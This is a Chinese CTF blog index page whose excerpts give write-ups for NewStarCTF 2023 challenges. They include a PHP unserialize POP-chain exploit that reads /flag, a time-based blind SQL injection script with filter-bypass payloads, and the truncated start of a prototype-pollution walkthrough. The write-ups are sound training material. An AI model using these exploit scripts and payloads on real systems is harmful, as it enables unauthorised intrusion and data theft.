<!doctype html>
<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>INSOMNIA.__é€ƒç¦»å¤±çœ __</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="INSOMNIA.__é€ƒç¦»å¤±çœ __"><meta name="msapplication-TileImage" content="/img/favicon.svg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="INSOMNIA.__é€ƒç¦»å¤±çœ __"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta property="og:type" content="blog"><meta property="og:title" content="Ins0mn1a"><meta property="og:url" content="https://luffys93.github.io/"><meta property="og:site_name" content="__é€ƒç¦»å¤±çœ __"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://luffys93.github.io/img/LUFFY.jpg"><meta property="article:author" content="Ins0mn1a"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="https://luffys93.github.io/img/LUFFY.jpg"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://luffys93.github.io"},"headline":"INSOMNIA.__é€ƒç¦»å¤±çœ __","image":["http://luffys93.github.io/img/og_image.png"],"author":{"@type":"Person","name":"Ins0mn1a"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject"}},"description":""}</script><link rel="icon" href="/img/favicon.svg"><meta name="referrer" content="no-referrer-when-downgrade"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/font-awesome/6.0.0/css/all.min.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/highlight.js/9.12.0/styles/atom-one-light.min.css"><link rel="stylesheet" href="https://fonts.loli.net/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/font-awesome/5.12.0/css/all.min.css"><link rel="stylesheet" href="https://fonts.loli.net/css?family=Ubuntu:400,600|Source+Code+Pro|Monda:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|Microsoft YaHei:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&amp;amp;subset=latin,latin-ext|Inconsolata|Itim|Lobster.css"><script src="https://cdnjs.loli.net/ajax/libs/jquery/3.3.1/jquery.min.js"></script><script src="/js/globalUtils.js"></script><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" defer></script><!--!--><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/lightgallery/1.10.0/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/justifiedGallery/3.8.1/css/justifiedGallery.min.css"><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdnjs.loli.net/ajax/libs/pace/1.2.4/pace.min.js"></script><meta name="generator" content="Hexo 5.4.2"><link rel="alternate" href="/atom.xml" title="INSOMNIA.__é€ƒç¦»å¤±çœ __" type="application/atom+xml">
</head><body class="is-3-column has-navbar-fixed-top"><nav class="navbar navbar-main is-fixed-top"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/">INSOMNIA.__é€ƒç¦»å¤±çœ __</a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a><a class="navbar-item" href="/album">Album</a><a class="navbar-item" href="/friend">Friend</a><a class="navbar-item" href="/message">Message</a><a class="navbar-item" href="/self-talking">Self-talking</a><a class="navbar-item" href="/music">Music</a><a class="navbar-item" href="/media">Media</a></div><div class="navbar-end"><a class="navbar-item search" title="æœç´¢" href="javascript:;"><i class="fas fa-search"></i></a><a class="navbar-item" id="night-nav" title="Night Mode" href="javascript:;"><i class="fas fa-moon" id="night-icon"></i></a></div></div></div></nav><script type="text/javascript" src="/js/theme-setting.js"></script><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-6-widescreen"><!--!--><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus">Â </i>2024-04-10Â Â <a class="commentCountImg" href="/2024/04/10/ComputerInternet/Computer-Internet3/#comment-container"><span class="display-none-class">2526ab6c63615d504eec3d0345d95161</span><i class="far fa-comment-dots"></i>Â <span class="commentCount" id="2526ab6c63615d504eec3d0345d95161">99+</span>Â Â </a><span class="level-item"><i class="far fa-clock">Â </i>å‡ ç§’ Â <i class="fas fa-pencil-alt">Â </i>0.0Â k</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2024/04/10/ComputerInternet/Computer-Internet3/">Computer-Internet3</a></h1><div class="content"><h1 id="è¿è¾“å±‚"><a href="#è¿è¾“å±‚" class="headerlink" title="è¿è¾“å±‚"></a>è¿è¾“å±‚</h1></div><div class="index-category-tag"><div class="level-item"><i class="fas fa-folder-open has-text-grey">Â </i><a class="article-more button is-small link-muted index-categories" href="/categories/%E8%AE%A1%E7%BD%91/">è®¡ç½‘</a></div>Â Â <hr></div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus">Â </i>2024-03-30Â Â <a class="commentCountImg" href="/2024/03/30/nssctf/nssctf-round20/#comment-container"><span class="display-none-class">063c914a7ac53699f878d75f45c284b2</span><i class="far fa-comment-dots"></i>Â <span class="commentCount" id="063c914a7ac53699f878d75f45c284b2">99+</span>Â Â </a><span class="level-item"><i class="far fa-clock">Â </i>å‡ ç§’ Â <i class="fas fa-pencil-alt">Â </i>0.0Â k</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2024/03/30/nssctf/nssctf-round20/">nssctf-round20</a></h1><div class="content"><h1 id="çœŸäº¦å‡ï¼Œå‡äº¦çœŸ"><a href="#çœŸäº¦å‡ï¼Œå‡äº¦çœŸ" class="headerlink" title="çœŸäº¦å‡ï¼Œå‡äº¦çœŸ"></a>çœŸäº¦å‡ï¼Œå‡äº¦çœŸ</h1><p>dirsearchæ‰«æ‰«å°±è¡Œï¼Œæœ‰ä¸ª<code>/flag</code></p>
<img src="/2024/03/30/nssctf/nssctf-round20/image-20240330135417001.png" class="" title="image-20240330135417001">

</div><div class="index-category-tag">Â Â <hr></div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus">Â </i>2024-03-29Â Â <a class="commentCountImg" href="/2024/03/29/buuctf/buu2/#comment-container"><span class="display-none-class">b19b0d1bae6a85641d6e50a4ea9b9ae3</span><i class="far fa-comment-dots"></i>Â <span class="commentCount" id="b19b0d1bae6a85641d6e50a4ea9b9ae3">99+</span>Â Â </a><span class="level-item"><i class="far fa-clock">Â </i>33 åˆ†é’Ÿ Â <i class="fas fa-pencil-alt">Â </i>4.9Â k</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2024/03/29/buuctf/buu2/">buuåšé¢˜è®°å½•ï¼ˆ2ï¼‰</a></h1><div class="content"><p>:::warning no-icon</p>
<p>åšé¢˜è®°å½•å¦‚ä¸‹</p>
<p><a href="https://luffys93.github.io/buuctf/buu/">buu1</a> -&gt; <a href="https://luffys93.github.io/buuctf/buu2/">buu2</a></p>
<p>:::</p>
<p>ä¹¦æ¥ä¸Šå›</p>
<h1 id="NewStarCTF-2023-å…¬å¼€èµ›é“-POP-Gadget"><a href="#NewStarCTF-2023-å…¬å¼€èµ›é“-POP-Gadget" class="headerlink" title="[NewStarCTF 2023 å…¬å¼€èµ›é“]POP Gadget"></a>[NewStarCTF 2023 å…¬å¼€èµ›é“]POP Gadget</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Begin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9]/&quot;</span>,<span class="variable">$this</span>-&gt;name))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Welcome to NewStarCTF 2023!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Then</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$func</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Good Job!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$obj</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$vars</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">end</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Super</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">getStr</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">end</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;==GAME OVER==&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTF</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$handle</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">end</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;handle-&gt;log);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WhiteGod</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unset</span>(<span class="params"><span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)(<span class="variable language_">$this</span>-&gt;<span class="keyword">var</span>);    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pop&#x27;</span>]); </span><br></pre></td></tr></table></figure>

<p>popé“¾å¾ˆå®¹æ˜“æ„é€ ï¼š</p>
<p><code>Begin::destruct-&gt;Then::toString-&gt;Super::invoke-&gt;Handle::call-&gt;CTF::end-&gt;WhiteGod::unset</code></p>
<p>exp:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Begin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Then</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;func = <span class="variable">$a</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj = <span class="variable">$a</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Super</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj = <span class="variable">$a</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTF</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$handle</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;handle = <span class="variable">$a</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WhiteGod</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span> = <span class="string">&#x27;readfile&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span> = <span class="string">&#x27;/flag&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Begin</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;name = <span class="keyword">new</span> <span class="title class_">Then</span>(<span class="keyword">new</span> <span class="title class_">Super</span>(<span class="keyword">new</span> <span class="title class_">Handle</span>(<span class="keyword">new</span> <span class="title function_ invoke__">CTF</span>(<span class="keyword">new</span> <span class="title class_">WhiteGod</span>()))));</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>)));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæš‚æ—¶ä¸æ¸…æ¥šsystemä¸ºä»€ä¹ˆè¯»å–ä¸åˆ°flagï¼Œä¹Ÿä¸èƒ½æ‰§è¡Œls /</p>
<h1 id="NewStarCTF-2023-å…¬å¼€èµ›é“-midsql"><a href="#NewStarCTF-2023-å…¬å¼€èµ›é“-midsql" class="headerlink" title="[NewStarCTF 2023 å…¬å¼€èµ›é“]midsql"></a>[NewStarCTF 2023 å…¬å¼€èµ›é“]midsql</h1><p>æ—¶é—´ç›²æ³¨ï¼Œå› ä¸ºorder byå’Œå¸ƒå°”æ³¨å…¥éƒ½ä¸è¡Œã€‚</p>
<p>è¿‡æ»¤äº†ç©ºæ ¼å’Œç­‰å·ï¼Œå¯ä»¥åˆ†åˆ«ç”¨/**/å’Œlikeç»•è¿‡ï¼Œè„šæœ¬å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://5686ca9d-7929-475e-93b4-f47d88c70ecc.node5.buuoj.cn:81/?id=&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># payload = &#x27;1/**/and/**/if((ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;),sleep(5),1);#&#x27; # ctf</span></span><br><span class="line">    <span class="comment"># payload = &#x27;1/**/and/**/if((ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/\&#x27;ctf\&#x27;),&#123;&#125;,1))&gt;&#123;&#125;),sleep(4),1);#&#x27; #items</span></span><br><span class="line">    <span class="comment"># payload = &#x27;1/**/and/**/if((ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name/**/like/**/\&#x27;items\&#x27;),&#123;&#125;,1))&gt;&#123;&#125;),sleep(4),1);#&#x27; #id,name,price</span></span><br><span class="line">    payload = <span class="string">&#x27;1/**/and/**/if((ascii(substr((select/**/group_concat(id,name,price)/**/from/**/items),&#123;&#125;,1))&gt;&#123;&#125;),sleep(4),1);#&#x27;</span></span><br><span class="line">    left = <span class="number">32</span></span><br><span class="line">    right = <span class="number">127</span></span><br><span class="line">    mid = (left + right) &gt;&gt; <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span>(left &lt; right):</span><br><span class="line">        str1 = url + payload.<span class="built_in">format</span>(i,mid)</span><br><span class="line">        time_start = time.time()</span><br><span class="line">        res = requests.get(str1)</span><br><span class="line">        <span class="built_in">print</span>(str1)</span><br><span class="line">        <span class="keyword">if</span> time.time() - time_start &gt; <span class="number">2</span>:</span><br><span class="line">            left = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            right = mid</span><br><span class="line">        mid = (left + right) &gt;&gt; <span class="number">1</span></span><br><span class="line">    flag += <span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<h1 id="NewStarCTF-2023-å…¬å¼€èµ›é“-OtenkiGirl"><a href="#NewStarCTF-2023-å…¬å¼€èµ›é“-OtenkiGirl" class="headerlink" title="[NewStarCTF 2023 å…¬å¼€èµ›é“]OtenkiGirl"></a>[NewStarCTF 2023 å…¬å¼€èµ›é“]OtenkiGirl</h1><p>è¿™é¢˜åº”è¯¥æ˜¯åŸå‹é“¾æ±¡æŸ“ï¼Œæ ¹æ®æç¤ºï¼Œæˆ‘ä»¬æŸ¥çœ‹routeç›®å½•ä¸‹çš„info.js</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">Router</span> = <span class="built_in">require</span>(<span class="string">&quot;koa-router&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> <span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">SQL</span> = <span class="built_in">require</span>(<span class="string">&quot;./sql&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> sql = <span class="keyword">new</span> <span class="title function_">SQL</span>(<span class="string">&quot;wishes&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">CONFIG</span> = <span class="built_in">require</span>(<span class="string">&quot;../config&quot;</span>)</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">DEFAULT_CONFIG</span> = <span class="built_in">require</span>(<span class="string">&quot;../config.default&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">getInfo</span>(<span class="params">timestamp</span>) &#123;</span><br><span class="line">    timestamp = <span class="keyword">typeof</span> timestamp === <span class="string">&quot;number&quot;</span> ? timestamp : <span class="title class_">Date</span>.<span class="title function_">now</span>();</span><br><span class="line">    <span class="comment">// Remove test data from before the movie was released</span></span><br><span class="line">    <span class="keyword">let</span> minTimestamp = <span class="keyword">new</span> <span class="title class_">Date</span>(<span class="variable constant_">CONFIG</span>.<span class="property">min_public_time</span> || <span class="variable constant_">DEFAULT_CONFIG</span>.<span class="property">min_public_time</span>).<span class="title function_">getTime</span>();</span><br><span class="line">    timestamp = <span class="title class_">Math</span>.<span class="title function_">max</span>(timestamp, minTimestamp);</span><br><span class="line">    <span class="keyword">const</span> data = <span class="keyword">await</span> sql.<span class="title function_">all</span>(<span class="string">`SELECT wishid, date, place, contact, reason, timestamp FROM wishes WHERE timestamp &gt;= ?`</span>, [timestamp]).<span class="title function_">catch</span>(<span class="function"><span class="params">e</span> =&gt;</span> &#123; <span class="keyword">throw</span> e &#125;);</span><br><span class="line">    <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&quot;/info/:ts?&quot;</span>, <span class="title function_">async</span> (ctx) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (ctx.<span class="property">header</span>[<span class="string">&quot;content-type&quot;</span>] !== <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> ctx.<span class="property">body</span> = &#123;</span><br><span class="line">            <span class="attr">status</span>: <span class="string">&quot;error&quot;</span>,</span><br><span class="line">            <span class="attr">msg</span>: <span class="string">&quot;Content-Type must be application/x-www-form-urlencoded&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> ctx.<span class="property">params</span>.<span class="property">ts</span> === <span class="string">&quot;undefined&quot;</span>) ctx.<span class="property">params</span>.<span class="property">ts</span> = <span class="number">0</span></span><br><span class="line">    <span class="keyword">const</span> timestamp = <span class="regexp">/^[0-9]+$/</span>.<span class="title function_">test</span>(ctx.<span class="property">params</span>.<span class="property">ts</span> || <span class="string">&quot;&quot;</span>) ? <span class="title class_">Number</span>(ctx.<span class="property">params</span>.<span class="property">ts</span>) : ctx.<span class="property">params</span>.<span class="property">ts</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> timestamp !== <span class="string">&quot;number&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> ctx.<span class="property">body</span> = &#123;</span><br><span class="line">            <span class="attr">status</span>: <span class="string">&quot;error&quot;</span>,</span><br><span class="line">            <span class="attr">msg</span>: <span class="string">&quot;Invalid parameter ts&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> data = <span class="keyword">await</span> <span class="title function_">getInfo</span>(timestamp).<span class="title function_">catch</span>(<span class="function"><span class="params">e</span> =&gt;</span> &#123; <span class="keyword">throw</span> e &#125;);</span><br><span class="line">        ctx.<span class="property">body</span> = &#123;</span><br><span class="line">            <span class="attr">status</span>: <span class="string">&quot;success&quot;</span>,</span><br><span class="line">            <span class="attr">data</span>: data</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(e);</span><br><span class="line">        <span class="keyword">return</span> ctx.<span class="property">body</span> = &#123;</span><br><span class="line">            <span class="attr">status</span>: <span class="string">&quot;error&quot;</span>,</span><br><span class="line">            <span class="attr">msg</span>: <span class="string">&quot;Internal Server Error&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure>

<p>æœ‰ä¸€ä¸ªå¯¹è·¯å¾„åçš„è¿‡æ»¤ï¼Œä¸è¿‡å½±å“ä¸å¤§ï¼Œä¼ æ•°å­—å°±è¡Œäº†</p>
<p>æŸ¥çœ‹submit.js</p>
